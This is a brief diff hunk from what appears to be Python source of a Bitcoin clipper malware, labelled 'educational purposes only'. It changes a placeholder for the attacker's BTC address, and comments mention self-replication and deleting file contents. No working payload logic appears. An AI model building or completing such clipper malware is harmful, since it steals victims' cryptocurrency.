@@ -9,7 +9,7 @@ import logging
 
 # DEVELOPED BY SAIKO / GITHUB.COM/SAIKO-XBL / EDUCATIONAL PURPOSES ONLY
 
-BTC_ADDRESS = 'you have been infected by btc clipper malware'
+BTC_ADDRESS = 'put desired btc address here'
 
 #Add code/ message in current.py file after deleting current .py file contents after replicating.
 SELF_DESTRUCT_MESSAGE = 'File contents have been deleted. \n To remove the \
